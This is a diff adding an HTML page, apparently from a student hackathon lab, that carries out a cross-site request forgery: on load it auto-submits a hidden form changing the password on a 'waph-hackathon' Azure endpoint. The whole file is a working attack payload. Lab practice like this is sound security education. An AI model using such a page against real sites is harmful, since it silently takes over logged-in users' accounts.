@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>CSRF Attack demo</title>
+</head>
+<body>
+	<script>
+	function CSRF(){
+		var form=document.createElement('form')
+		form.action='https://waph-hackathon.eastus.cloudapp.azure.com/csrf/changepassword.php'
+		form.method='POST'
+		form.target='_self'
+		form.innerHTML='<input type="text" name="newpassword" value="waph-vemuri">;'
+		document.body.appendChild(form);
+		alert('CSRF Attack is about to start by Krishithanjali Vemuri');
+		form.submit();
+	}
+	CSRF();
+	</script>
+</body>
+</html>
